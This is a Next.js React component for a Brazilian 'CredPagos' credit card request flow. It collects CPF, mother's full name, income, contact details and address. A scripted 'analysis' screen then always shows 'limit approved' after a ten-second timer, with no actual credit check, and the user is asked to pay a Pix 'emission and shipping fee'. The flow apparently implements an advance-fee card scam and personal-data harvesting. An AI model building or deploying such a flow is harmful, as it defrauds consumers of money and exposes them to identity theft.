"use client";

import { createElement, useEffect, useMemo, useRef, useState } from "react";
import Image from "next/image";
import Script from "next/script";
import { BadgeDollarSign, Check, ChevronRight, Copy, Grid3X3, Info } from "lucide-react";
import { CardFlowHeader } from "@/components/credito/CardFlowHeader";
import { CardSimulatorIntro } from "@/components/credito/CardSimulatorIntro";
import { SearchableProfessionSelect } from "@/components/credito/SearchableProfessionSelect";
import { CARD_REQUEST_PROFESSIONS } from "@/components/credito/cardRequestProfessions";
import { formatCurrencyBrl, maskPhoneBr } from "@/lib/credit/helpers";
import { calculateCreditCardLimit } from "@/services/credit/calculateCreditCardLimit";
import { fetchAddressByZipCode } from "@/services/credit/fetchAddressByZipCode";

type PaymentStatus = "pending" | "paid" | "expired" | "error";
type ZipCodeStatus = "idle" | "loading" | "success" | "error";
type CardFlowStep = 1 | 2 | 3 | 4 | 5;
type CardFlowStage = "intro" | CardFlowStep | "approved" | "payment";

type VexusCashInChargeView = {
  amount: number;
  transactionId: string;
  status: string;
  copyPaste: string;
  qrCodeImageUrl: string;
  providerMessage?: string;
};

type VexusPixStatusView = {
  status: string;
  paid: boolean;
  failed: boolean;
};

type ApiEnvelope<T> =
  | {
      success: true;
      data: T;
    }
  | {
      success: false;
      error?: {
        message?: string;
      };
    };

type CardRequestState = {
  fullName: string;
  email: string;
  phone: string;
  birthDate: string;
  monthlyIncome: number;
  motherName: string;
  profession: string;
  customProfession: string;
  zipCode: string;
  street: string;
  number: string;
  noNumber: boolean;
  complement: string;
  neighborhood: string;
  state: string;
  city: string;
  invoiceDueDay: string;
  approvedLimit: number;
  paymentStatus: PaymentStatus;
  pixCopyPaste: string;
  qrCodeImageUrl: string;
  zipCodeStatus: ZipCodeStatus;
  zipCodeError: string;
};

const INVOICE_OPTIONS = [
  "Todo dia 1",
  "Todo dia 5",
  "Todo dia 10",
  "Todo dia 15",
  "Todo dia 20",
  "Todo dia 25",
] as const;

const PAYMENT_ITEMS = [
  { label: "Taxa de emissão do cartão", value: 29.9 },
  { label: "Frete para entrega", value: 15 },
  { label: "Processamento do pedido", value: 5 },
] as const;

const PAYMENT_TOTAL = PAYMENT_ITEMS.reduce((total, item) => total + item.value, 0);

const PLACEHOLDER_PIX_CODE = "";

const PAYMENT_TRANSACTION_CODE = "4900";
const APPROVED_CARD_SOURCES = [
  "/assets/img/cartao/cartao-s-nome.png",
  "/assets/img/cartao/cartao-s-nome.webp",
  "/assets/img/cartao/cartao-s-nome.jpg",
  "/assets/img/cartao/cartao-s-nome.jpeg",
  "/assets/img/cartao/cartão-s-nome.png",
  "/assets/img/cartao/cartão-s-nome.webp",
  "/assets/img/cartao/cartao-01.png",
] as const;

const INITIAL_STATE: CardRequestState = {
  fullName: "",
  email: "",
  phone: "",
  birthDate: "",
  monthlyIncome: 0,
  motherName: "",
  profession: "",
  customProfession: "",
  zipCode: "",
  street: "",
  number: "",
  noNumber: false,
  complement: "",
  neighborhood: "",
  state: "",
  city: "",
  invoiceDueDay: "Todo dia 1",
  approvedLimit: 3000,
  paymentStatus: "pending",
  pixCopyPaste: PLACEHOLDER_PIX_CODE,
  qrCodeImageUrl: "",
  zipCodeStatus: "idle",
  zipCodeError: "",
};

function onlyNumbers(value: string) {
  return value.replace(/\D/g, "");
}

function formatZipCode(value: string) {
  const digits = onlyNumbers(value).slice(0, 8);

  if (digits.length <= 5) {
    return digits;
  }

  return `${digits.slice(0, 5)}-${digits.slice(5)}`;
}

function formatBirthDateBr(value: string) {
  const digits = onlyNumbers(value).slice(0, 8);

  if (digits.length <= 2) {
    return digits;
  }

  if (digits.length <= 4) {
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
}

function parseCurrencyInput(value: string) {
  const digits = onlyNumbers(value);

  if (!digits) {
    return 0;
  }

  const cents = Number(digits);
  if (!Number.isFinite(cents)) {
    return 0;
  }

  return cents / 100;
}

function createCardProtocol() {
  const now = new Date();
  const datePart = `${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, "0")}${String(now.getDate()).padStart(2, "0")}`;
  const suffix = Math.random().toString(16).slice(2, 8).toUpperCase();
  return `CPG-CARD-${datePart}-${suffix}`;
}

async function readApiEnvelope<T>(response: Response) {
  const json = (await response.json().catch(() => null)) as ApiEnvelope<T> | null;

  if (!response.ok || !json?.success) {
    throw new Error(
      json?.success === false
        ? json.error?.message || "Nao foi possivel processar o Pix."
        : "Nao foi possivel processar o Pix.",
    );
  }

  return json.data;
}

function isPaidProviderStatus(status: string) {
  return ["COMPLETED", "PAID", "PAGO", "APPROVED", "CONFIRMED", "LIQUIDATED"].includes(status.toUpperCase());
}

function isFailedProviderStatus(status: string) {
  return ["FAILED", "EXPIRED", "CANCELED", "CANCELLED", "REJECTED"].includes(status.toUpperCase());
}

function validateEmail(value: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
}

function validateFullName(value: string) {
  return value.trim().split(/\s+/).filter(Boolean).length >= 2;
}

function formatCardHolderName(value: string, maxLength = 24) {
  const parts = value
    .trim()
    .split(/\s+/)
    .filter(Boolean)
    .map((part) => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase());

  if (parts.length === 0) {
    return "Nome do cliente";
  }

  const fullName = parts.join(" ");
  if (fullName.length <= maxLength) {
    return fullName;
  }

  if (parts.length >= 4) {
    const shortened = [parts[0], ...parts.slice(1, -2).map((part) => part.charAt(0)), ...parts.slice(-2)].join(" ");
    if (shortened.length <= maxLength) {
      return shortened;
    }
  }

  if (parts.length === 3) {
    const shortened = [parts[0], parts[1].charAt(0), parts[2]].join(" ");
    if (shortened.length <= maxLength) {
      return shortened;
    }
  }

  if (parts.length >= 2) {
    const firstAndLast = [parts[0], parts[parts.length - 1]].join(" ");
    if (firstAndLast.length <= maxLength) {
      return firstAndLast;
    }
  }

  return fullName.slice(0, maxLength).trim();
}

function getStepTitle(step: CardFlowStep) {
  if (step === 1) {
    return "Preencha seus dados para continuar o pedido";
  }

  if (step === 2) {
    return "Agora, precisamos de mais algumas informações";
  }

  if (step === 3) {
    return "Em qual endereço você quer receber o cartão?";
  }

  if (step === 4) {
    return "Qual o dia do vencimento da sua fatura?";
  }

  return "Analise";
}

function getStepErrors(step: CardFlowStep, state: CardRequestState) {
  const errors: Record<string, string> = {};

  if (step === 1) {
    if (!validateFullName(state.fullName)) {
      errors.fullName = "Informe nome e sobrenome.";
    }

    if (!validateEmail(state.email)) {
      errors.email = "Informe um e-mail válido.";
    }

    if (onlyNumbers(state.phone).length < 11) {
      errors.phone = "Informe um celular válido.";
    }
  }

  if (step === 2) {
    if (!state.birthDate) {
      errors.birthDate = "Informe a data de nascimento.";
    }

    if (state.monthlyIncome <= 0) {
      errors.monthlyIncome = "Informe a renda mensal.";
    }

    if (!validateFullName(state.motherName)) {
      errors.motherName = "Informe o nome completo da sua mãe.";
    }

    if (!CARD_REQUEST_PROFESSIONS.includes(state.profession as (typeof CARD_REQUEST_PROFESSIONS)[number])) {
      errors.profession = "Selecione uma profissão da lista.";
    }

    if (state.profession === "Outros" && !state.customProfession.trim()) {
      errors.customProfession = "Informe sua profissão.";
    }
  }

  if (step === 3) {
    if (onlyNumbers(state.zipCode).length !== 8) {
      errors.zipCode = "Informe um CEP válido.";
    }

    if (!state.street.trim()) {
      errors.street = "Informe a rua/avenida.";
    }

    if (!state.noNumber && !state.number.trim()) {
      errors.number = "Informe o número.";
    }

    if (!state.neighborhood.trim()) {
      errors.neighborhood = "Informe o bairro.";
    }

    if (!state.state.trim()) {
      errors.state = "Informe o estado.";
    }

    if (!state.city.trim()) {
      errors.city = "Informe a cidade.";
    }
  }

  if (step === 4 && !state.invoiceDueDay.trim()) {
    errors.invoiceDueDay = "Selecione o dia do vencimento.";
  }

  return errors;
}

function getProgressPercent(step: CardFlowStep) {
  if (step === 1) {
    return 20;
  }

  if (step === 2) {
    return 40;
  }

  if (step === 3) {
    return 60;
  }

  if (step === 4) {
    return 80;
  }

  return 100;
}

type CardProgressHeaderProps = {
  step: CardFlowStep;
};

function CardProgressHeader({ step }: CardProgressHeaderProps) {
  return (
    <header className="credpagos-card-request-progress">
      <div className="credpagos-card-request-progress__line">
        <strong>Resumo do Pedido</strong>
        <span>{step} de 5</span>
      </div>
      <div className="credpagos-card-request-progress__track">
        <span style={{ width: `${getProgressPercent(step)}%` }} />
      </div>
    </header>
  );
}

function CardLeftPanel() {
  return (
    <aside className="credpagos-card-request-left" aria-label="Resumo do cartão CredPagos">
      <article className="credpagos-card-request-offer">
        <div className="credpagos-card-request-offer__media">
          <Image
            src="/assets/img/cartao/cartao-01.png"
            alt="Cartão CredPagos"
            width={2271}
            height={1408}
            className="credpagos-card-request-offer__image"
          />
        </div>

        <div className="credpagos-card-request-offer__benefits">
          <div className="credpagos-card-request-offer__row">
            <Grid3X3 aria-hidden="true" size={22} strokeWidth={2.2} />
            <div>
              <strong>Pontuação</strong>
              <span>Até 3,5 pontos por 1 dólar gasto</span>
            </div>
          </div>

          <div className="credpagos-card-request-offer__row">
            <BadgeDollarSign aria-hidden="true" size={22} strokeWidth={2.2} />
            <div>
              <strong>Mensalidade</strong>
              <span>Grátis ao gastar R$ 20 mil por fatura</span>
            </div>
          </div>
        </div>
      </article>
    </aside>
  );
}

export function CardRequestFlow() {
  const [stage, setStage] = useState<CardFlowStage>("intro");
  const [introCpf, setIntroCpf] = useState("");
  const [state, setState] = useState<CardRequestState>(INITIAL_STATE);
  const [approvedCardSourceIndex, setApprovedCardSourceIndex] = useState(0);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [copyLabel, setCopyLabel] = useState("Copiar");
  const [completedMessage, setCompletedMessage] = useState("");
  const [cashInCharge, setCashInCharge] = useState<VexusCashInChargeView | null>(null);
  const [isLoadingCashInCharge, setIsLoadingCashInCharge] = useState(false);
  const [pixErrorMessage, setPixErrorMessage] = useState<string | null>(null);
  const [pixRetryCount, setPixRetryCount] = useState(0);
  const [protocol] = useState(() => createCardProtocol());
  const lastFetchedZipCodeRef = useRef("");
  const hasManualAddressEditRef = useRef(false);

  const currentStep = typeof stage === "number" ? stage : null;
  const canContinueCurrentStep = currentStep ? Object.keys(getStepErrors(currentStep, state)).length === 0 : false;
  const paymentTransactionId = `${protocol}-PIX-${PAYMENT_TRANSACTION_CODE}-${pixRetryCount}`;

  useEffect(() => {
    if (stage !== 5) {
      return;
    }

    const timeoutId = window.setTimeout(() => {
      setStage("approved");
    }, 10_000);

    return () => {
      window.clearTimeout(timeoutId);
    };
  }, [stage]);

  useEffect(() => {
    if (stage !== "payment") {
      return;
    }

    let cancelled = false;

    async function createCashInCharge() {
      setIsLoadingCashInCharge(true);
      setPixErrorMessage(null);
      setCompletedMessage("");
      setCopyLabel("Copiar");
      setCashInCharge(null);
      setState((current) => ({
        ...current,
        paymentStatus: "pending",
        pixCopyPaste: "",
        qrCodeImageUrl: "",
      }));

      try {
        const data = await readApiEnvelope<{ charge: VexusCashInChargeView }>(
          await fetch("/api/credito/pix/vexus/cash-in", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              protocol,
              transactionId: paymentTransactionId,
              payerName: state.fullName.trim() || "Cliente CredPagos",
              payerDocument: introCpf || onlyNumbers(state.phone),
              payerEmail: state.email.trim() || undefined,
              amount: PAYMENT_TOTAL,
              description: "Taxa de emissao e frete do cartao CredPagos",
            }),
          }),
        );

        if (!cancelled) {
          setCashInCharge(data.charge);
          setState((current) => ({
            ...current,
            pixCopyPaste: data.charge.copyPaste || current.pixCopyPaste,
            qrCodeImageUrl: data.charge.qrCodeImageUrl || current.qrCodeImageUrl,
            paymentStatus: isPaidProviderStatus(data.charge.status)
              ? "paid"
              : isFailedProviderStatus(data.charge.status)
                ? "error"
                : "pending",
          }));
        }
      } catch (error) {
        if (!cancelled) {
          setPixErrorMessage(
            error instanceof Error ? error.message : "Nao foi possivel gerar o Pix da Vexus.",
          );
          setState((current) => ({
            ...current,
            paymentStatus: "error",
          }));
        }
      } finally {
        if (!cancelled) {
          setIsLoadingCashInCharge(false);
        }
      }
    }

    void createCashInCharge();

    return () => {
      cancelled = true;
    };
  }, [stage, protocol, paymentTransactionId, state.email, state.fullName, state.phone]);

  useEffect(() => {
    if (stage !== "payment") {
      return;
    }

    if (!cashInCharge?.transactionId) {
      return;
    }

    const cashInTransactionId = cashInCharge.transactionId;

    if (state.paymentStatus === "paid" || state.paymentStatus === "expired") {
      return;
    }

    let cancelled = false;
    let isChecking = false;

    async function checkPixStatus() {
      if (isChecking) {
        return;
      }

      isChecking = true;

      try {
        const data = await readApiEnvelope<{ status: VexusPixStatusView }>(
          await fetch("/api/credito/pix/vexus/status", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              transactionId: cashInTransactionId,
            }),
          }),
        );

        if (cancelled) {
          return;
        }

        setCashInCharge((current) =>
          current
            ? {
                ...current,
                status: data.status.status,
              }
            : current,
        );

        if (data.status.paid) {
          setState((current) => ({
            ...current,
            paymentStatus: "paid",
          }));
          setPixErrorMessage(null);
          return;
        }

        if (data.status.failed) {
          setState((current) => ({
            ...current,
            paymentStatus: "expired",
          }));
          setPixErrorMessage("O Pix expirou ou precisa ser gerado novamente para continuar.");
          return;
        }
      } catch (error) {
        if (!cancelled) {
          setPixErrorMessage(
            error instanceof Error
              ? error.message
              : "Nao foi possivel validar o pagamento Pix agora.",
          );
        }
      } finally {
        isChecking = false;
      }
    }

    void checkPixStatus();

    const intervalId = window.setInterval(() => {
      void checkPixStatus();
    }, 6_000);

    return () => {
      cancelled = true;
      window.clearInterval(intervalId);
    };
  }, [cashInCharge?.transactionId, stage, state.paymentStatus]);

  useEffect(() => {
    if (stage !== 3) {
      return;
    }

    const cleanZipCode = onlyNumbers(state.zipCode);

    if (cleanZipCode.length !== 8) {
      setState((current) =>
        current.zipCodeStatus === "idle" && !current.zipCodeError
          ? current
          : {
              ...current,
              zipCodeStatus: "idle",
              zipCodeError: "",
            },
      );
      return;
    }

    if (cleanZipCode === lastFetchedZipCodeRef.current) {
      return;
    }

    let cancelled = false;

    setState((current) => ({
      ...current,
      zipCodeStatus: "loading",
      zipCodeError: "",
    }));

    async function lookupZipCode() {
      try {
        const address = await fetchAddressByZipCode(cleanZipCode);

        if (cancelled) {
          return;
        }

        lastFetchedZipCodeRef.current = cleanZipCode;

        setState((current) => ({
          ...current,
          street: hasManualAddressEditRef.current ? current.street : address.street,
          neighborhood: hasManualAddressEditRef.current ? current.neighborhood : address.neighborhood,
          state: hasManualAddressEditRef.current ? current.state : address.state,
          city: hasManualAddressEditRef.current ? current.city : address.city,
          zipCodeStatus: "success",
          zipCodeError: "",
        }));
      } catch {
        if (cancelled) {
          return;
        }

        setState((current) => ({
          ...current,
          zipCodeStatus: "error",
          zipCodeError:
            "CEP não encontrado. Confira o número informado ou preencha o endereço manualmente.",
        }));
      }
    }

    void lookupZipCode();

    return () => {
      cancelled = true;
    };
  }, [stage, state.zipCode]);

  function updateField<K extends keyof CardRequestState>(field: K, value: CardRequestState[K]) {
    setErrors((current) => {
      if (!current[field as string]) {
        return current;
      }

      const next = { ...current };
      delete next[field as string];
      return next;
    });

    setState((current) => ({ ...current, [field]: value }));
  }

  function updateAddressField<K extends "street" | "neighborhood" | "state" | "city">(
    field: K,
    value: CardRequestState[K],
  ) {
    hasManualAddressEditRef.current = true;
    updateField(field, value);
  }

  function goToNextStep() {
    if (typeof stage !== "number") {
      return;
    }

    const nextErrors = getStepErrors(stage, state);
    setErrors(nextErrors);

    if (Object.keys(nextErrors).length > 0) {
      return;
    }

    if (stage === 4) {
      const limitResult = calculateCreditCardLimit({
        monthlyIncome: state.monthlyIncome,
      });

      setState((current) => ({
        ...current,
        approvedLimit: limitResult.suggestedLimit,
      }));
    }

    if (stage < 5) {
      setStage((stage + 1) as CardFlowStep);
      return;
    }

    setStage("approved");
  }

  async function copyPixCode() {
    if (!state.pixCopyPaste) {
      return;
    }

    try {
      await navigator.clipboard.writeText(state.pixCopyPaste);
      setCopyLabel("Copiado");
      window.setTimeout(() => {
        setCopyLabel("Copiar");
      }, 2200);
    } catch {
      setCopyLabel("Copiar");
    }
  }

  function renderStepOne() {
    return (
      <>
        <h2>{getStepTitle(1)}</h2>

        <div className="credpagos-card-request-fields">
          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="fullName"
              name="fullName"
              type="text"
              placeholder=" "
              value={state.fullName}
              onChange={(event) => updateField("fullName", event.target.value)}
            />
            <label htmlFor="fullName">Nome completo</label>
          </div>
          {errors.fullName ? <small className="credpagos-form-error">{errors.fullName}</small> : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="email"
              name="email"
              type="email"
              placeholder=" "
              value={state.email}
              onChange={(event) => updateField("email", event.target.value)}
            />
            <label htmlFor="email">E-mail</label>
          </div>
          {errors.email ? <small className="credpagos-form-error">{errors.email}</small> : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="phone"
              name="phone"
              type="text"
              placeholder=" "
              value={state.phone}
              onChange={(event) => updateField("phone", maskPhoneBr(event.target.value))}
            />
            <label htmlFor="phone">Celular</label>
          </div>
          {errors.phone ? <small className="credpagos-form-error">{errors.phone}</small> : null}
        </div>

        <p className="credpagos-card-request-legal">
          Ao continuar seu pedido, você está ciente da Política de Privacidade CredPagos e aceita as condições do
          Sistema de Informações de Crédito (SCR).
        </p>

        <button
          type="button"
          className="credpagos-card-request-button"
          onClick={goToNextStep}
          disabled={!canContinueCurrentStep}
        >
          Continuar
          <ChevronRight aria-hidden="true" size={21} />
        </button>
      </>
    );
  }

  function renderStepTwo() {
    return (
      <>
        <h2>{getStepTitle(2)}</h2>

        <div className="credpagos-card-request-fields">
          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="birthDate"
              name="birthDate"
              type="text"
              inputMode="numeric"
              placeholder=" "
              value={state.birthDate}
              onChange={(event) => updateField("birthDate", formatBirthDateBr(event.target.value))}
            />
            <label htmlFor="birthDate">Data nascimento</label>
          </div>
          {errors.birthDate ? <small className="credpagos-form-error">{errors.birthDate}</small> : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="monthlyIncome"
              name="monthlyIncome"
              type="text"
              inputMode="numeric"
              placeholder=" "
              value={state.monthlyIncome > 0 ? formatCurrencyBrl(state.monthlyIncome) : ""}
              onChange={(event) => updateField("monthlyIncome", parseCurrencyInput(event.target.value))}
            />
            <label htmlFor="monthlyIncome">Renda mensal aproximada</label>
          </div>
          {errors.monthlyIncome ? <small className="credpagos-form-error">{errors.monthlyIncome}</small> : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="motherName"
              name="motherName"
              type="text"
              placeholder=" "
              value={state.motherName}
              onChange={(event) => updateField("motherName", event.target.value)}
            />
            <label htmlFor="motherName">Nome completo da sua mãe</label>
          </div>
          {errors.motherName ? <small className="credpagos-form-error">{errors.motherName}</small> : null}

          <SearchableProfessionSelect
            id="card-request-profession"
            name="profession"
            label="Profissão"
            value={state.profession}
            options={CARD_REQUEST_PROFESSIONS}
            error={errors.profession}
            onChange={(value) => {
              updateField("profession", value);

              if (value !== "Outros") {
                updateField("customProfession", "");
              }
            }}
          />

          {state.profession === "Outros" ? (
            <div className="credpagos-card-field credpagos-card-field--floating">
              <input
                id="customProfession"
                name="customProfession"
                type="text"
                placeholder=" "
                value={state.customProfession}
                onChange={(event) => updateField("customProfession", event.target.value)}
              />
              <label htmlFor="customProfession">Informe sua profissão</label>
            </div>
          ) : null}
          {errors.customProfession ? <small className="credpagos-form-error">{errors.customProfession}</small> : null}
        </div>

        <button
          type="button"
          className="credpagos-card-request-button"
          onClick={goToNextStep}
          disabled={!canContinueCurrentStep}
        >
          Continuar
          <ChevronRight aria-hidden="true" size={21} />
        </button>
      </>
    );
  }

  function renderStepThree() {
    return (
      <>
        <h2>{getStepTitle(3)}</h2>

        <div className="credpagos-card-request-fields">
          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="zipCode"
              name="zipCode"
              type="text"
              inputMode="numeric"
              placeholder=" "
              value={state.zipCode}
              onChange={(event) => {
                updateField("zipCode", formatZipCode(event.target.value));
                lastFetchedZipCodeRef.current = "";
                hasManualAddressEditRef.current = false;
              }}
            />
            <label htmlFor="zipCode">CEP</label>
          </div>
          {errors.zipCode ? <small className="credpagos-form-error">{errors.zipCode}</small> : null}
          {state.zipCodeStatus === "loading" ? (
            <small className="credpagos-card-request-helper">Buscando endereço...</small>
          ) : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="street"
              name="street"
              type="text"
              placeholder=" "
              value={state.street}
              onChange={(event) => updateAddressField("street", event.target.value)}
            />
            <label htmlFor="street">Rua/Avenida</label>
          </div>
          {errors.street ? <small className="credpagos-form-error">{errors.street}</small> : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="number"
              name="number"
              type="text"
              placeholder=" "
              value={state.number}
              disabled={state.noNumber}
              onChange={(event) => updateField("number", event.target.value)}
            />
            <label htmlFor="number">Número</label>
          </div>
          {errors.number ? <small className="credpagos-form-error">{errors.number}</small> : null}

          <label className="credpagos-card-request-check">
            <input
              type="checkbox"
              checked={state.noNumber}
              onChange={(event) => {
                const checked = event.target.checked;
                updateField("noNumber", checked);

                if (checked) {
                  updateField("number", "");
                }
              }}
            />
            Meu endereço não tem número
          </label>

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="complement"
              name="complement"
              type="text"
              placeholder=" "
              value={state.complement}
              onChange={(event) => updateField("complement", event.target.value)}
            />
            <label htmlFor="complement">Complemento (opcional)</label>
          </div>

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="neighborhood"
              name="neighborhood"
              type="text"
              placeholder=" "
              value={state.neighborhood}
              onChange={(event) => updateAddressField("neighborhood", event.target.value)}
            />
            <label htmlFor="neighborhood">Bairro</label>
          </div>
          {errors.neighborhood ? <small className="credpagos-form-error">{errors.neighborhood}</small> : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="state"
              name="state"
              type="text"
              placeholder=" "
              value={state.state}
              onChange={(event) => updateAddressField("state", event.target.value.toUpperCase().slice(0, 2))}
            />
            <label htmlFor="state">Estado</label>
          </div>
          {errors.state ? <small className="credpagos-form-error">{errors.state}</small> : null}

          <div className="credpagos-card-field credpagos-card-field--floating">
            <input
              id="city"
              name="city"
              type="text"
              placeholder=" "
              value={state.city}
              onChange={(event) => updateAddressField("city", event.target.value)}
            />
            <label htmlFor="city">Cidade</label>
          </div>
          {errors.city ? <small className="credpagos-form-error">{errors.city}</small> : null}
        </div>

        <button
          type="button"
          className="credpagos-card-request-button"
          onClick={goToNextStep}
          disabled={!canContinueCurrentStep}
        >
          Continuar
          <ChevronRight aria-hidden="true" size={21} />
        </button>
      </>
    );
  }

  function renderStepFour() {
    return (
      <>
        <h2>{getStepTitle(4)}</h2>

        <div className="credpagos-card-request-fields">
          <div
            className={`credpagos-card-field credpagos-card-field--floating ${
              state.invoiceDueDay ? "is-filled" : ""
            }`}
          >
            <select
              id="invoiceDueDay"
              name="invoiceDueDay"
              value={state.invoiceDueDay}
              required
              onChange={(event) => updateField("invoiceDueDay", event.target.value)}
            >
              <option value="" disabled hidden></option>
              {INVOICE_OPTIONS.map((option) => (
                <option key={option} value={option}>
                  {option}
                </option>
              ))}
            </select>
            <label htmlFor="invoiceDueDay">Dia do vencimento da fatura</label>
          </div>
          {errors.invoiceDueDay ? <small className="credpagos-form-error">{errors.invoiceDueDay}</small> : null}
        </div>

        <p className="credpagos-card-request-legal">
          Ao continuar, você concorda com os Termos do Contrato de cartão, o Uso consciente do cartão e o Débito do
          Mínimo.
        </p>

        <button
          type="button"
          className="credpagos-card-request-button"
          onClick={goToNextStep}
          disabled={!canContinueCurrentStep}
        >
          Continuar
          <ChevronRight aria-hidden="true" size={21} />
        </button>
      </>
    );
  }

  function renderStepFive() {
    return (
      <>
        <Script
          id="credpagos-card-loading-lottie-player"
          src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"
          strategy="afterInteractive"
        />
        <h2>{getStepTitle(5)}</h2>
        <div className="credpagos-card-request-analysis">
          {createElement("lottie-player", {
            "aria-hidden": "true",
            autoplay: true,
            background: "transparent",
            className: "credpagos-card-request-analysis__lottie",
            loop: true,
            speed: "1",
            src: "/assets/img/cartao/loading.json",
          })}
          <strong>Aguarde</strong>
        </div>
      </>
    );
  }

  function renderStepContent() {
    if (currentStep === 1) {
      return renderStepOne();
    }

    if (currentStep === 2) {
      return renderStepTwo();
    }

    if (currentStep === 3) {
      return renderStepThree();
    }

    if (currentStep === 4) {
      return renderStepFour();
    }

    return renderStepFive();
  }

  const approvedLimitFormatted = useMemo(() => formatCurrencyBrl(state.approvedLimit), [state.approvedLimit]);
  const approvedCardHolderName = useMemo(() => formatCardHolderName(state.fullName), [state.fullName]);
  const approvedCardSource = APPROVED_CARD_SOURCES[Math.min(approvedCardSourceIndex, APPROVED_CARD_SOURCES.length - 1)];

  if (stage === "intro") {
    return <CardSimulatorIntro cpf={introCpf} onCpfChange={setIntroCpf} onSubmit={() => setStage(1)} />;
  }

  if (stage === "approved") {
    return (
      <div className="credpagos-card-request-shell">
        <CardFlowHeader />

        <section className="credpagos-card-approved">
          <span className="credpagos-card-approved__icon" aria-hidden="true">
            <Check size={24} />
          </span>
          <h2>Limite aprovado</h2>
          <strong>{approvedLimitFormatted}</strong>

          <div className="credpagos-card-approved__card-frame">
            <img
              src={approvedCardSource}
              alt="Cartão CredPagos"
              className="credpagos-card-approved__card"
              onError={() => {
                setApprovedCardSourceIndex((current) =>
                  current < APPROVED_CARD_SOURCES.length - 1 ? current + 1 : current,
                );
              }}
            />
            <span className="credpagos-card-approved__holder-name">{approvedCardHolderName}</span>
          </div>

          <p>Clique em Continuar para prosseguir com a emissão do seu cartão de crédito.</p>

          <button
            type="button"
            className="credpagos-card-request-button credpagos-card-request-button--active"
            onClick={() => setStage("payment")}
          >
            Continuar
            <ChevronRight aria-hidden="true" size={21} />
          </button>
        </section>
      </div>
    );
  }

  if (stage === "payment") {
    return (
      <div className="credpagos-card-request-shell">
        <CardFlowHeader />

        <section className="credpagos-card-request">
          <CardLeftPanel />

          <div className="credpagos-card-request-right">
            <article className="credpagos-card-pix-panel">
              <h2>Taxa de Emissão + Frete</h2>
              <p>
                Para finalizar a solicitação do seu cartão, realize o pagamento da taxa única de emissão e envio.
              </p>

              <div className="credpagos-card-pix-summary">
                <ul>
                  {PAYMENT_ITEMS.map((item) => (
                    <li key={item.label}>
                      <span>{item.label}</span>
                      <strong>{formatCurrencyBrl(item.value)}</strong>
                    </li>
                  ))}
                </ul>

                <div className="credpagos-card-pix-summary__total">
                  <span>Valor total:</span>
                  <strong>{formatCurrencyBrl(PAYMENT_TOTAL)}</strong>
                </div>
              </div>

              <div className="credpagos-card-pix-qr">
                {state.qrCodeImageUrl ? (
                  <img src={state.qrCodeImageUrl} alt="QR Code Pix" width={260} height={260} />
                ) : (
                  <span className="credpagos-card-pix-qr__placeholder">
                    {isLoadingCashInCharge ? "Gerando QR Code..." : "QR Code indisponivel"}
                  </span>
                )}
              </div>

              <div className="credpagos-card-pix-copy">
                <h3>Pagamento via Pix</h3>
                <p>Escaneie o QR Code ou copie o código Pix abaixo para concluir o pagamento.</p>

                <div className="credpagos-card-pix-copy__code">{state.pixCopyPaste}</div>

                <button
                  type="button"
                  className="credpagos-card-request-button credpagos-card-request-button--active"
                  onClick={copyPixCode}
                  disabled={!state.pixCopyPaste || isLoadingCashInCharge}
                >
                  <Copy aria-hidden="true" size={20} />
                  {copyLabel}
                </button>

                {pixErrorMessage ? (
                  <p className="credpagos-alert credpagos-alert--error">{pixErrorMessage}</p>
                ) : null}

                {state.paymentStatus !== "paid" ? (
                  <button
                    type="button"
                    className="credpagos-card-request-button"
                    onClick={() => {
                      setCopyLabel("Copiar");
                      setPixRetryCount((current) => current + 1);
                      setPixErrorMessage(null);
                      setCashInCharge(null);
                      setState((current) => ({
                        ...current,
                        paymentStatus: "pending",
                        qrCodeImageUrl: "",
                        pixCopyPaste: PLACEHOLDER_PIX_CODE,
                      }));
                    }}
                    disabled={isLoadingCashInCharge}
                  >
                    Gerar novo Pix
                  </button>
                ) : null}

                <div className="credpagos-card-pix-note">
                  <Info aria-hidden="true" size={24} />
                  <div>
                    <p>
                      Após a confirmação do pagamento, clique em continuar para acompanhar a emissão do seu cartão de
                      crédito.
                    </p>
                    <small>A confirmação pode levar alguns minutos.</small>
                  </div>
                </div>

                <button
                  type="button"
                  className={`credpagos-card-request-button ${
                    state.paymentStatus === "paid" ? "credpagos-card-request-button--active" : ""
                  }`}
                  disabled={state.paymentStatus !== "paid"}
                  onClick={() => setCompletedMessage("Solicitação enviada. A emissão do cartão está em andamento.")}
                >
                  Continuar
                  <ChevronRight aria-hidden="true" size={21} />
                </button>

                {completedMessage ? <small className="credpagos-card-pix-copy__done">{completedMessage}</small> : null}
              </div>
            </article>
          </div>
        </section>
      </div>
    );
  }

  return (
    <div className="credpagos-card-request-shell">
      <CardFlowHeader />

      <section className="credpagos-card-request">
        <CardLeftPanel />

        <div className="credpagos-card-request-right">
          <CardProgressHeader step={currentStep ?? 5} />
          <article className="credpagos-card-request-content">{renderStepContent()}</article>
        </div>
      </section>
    </div>
  );
}
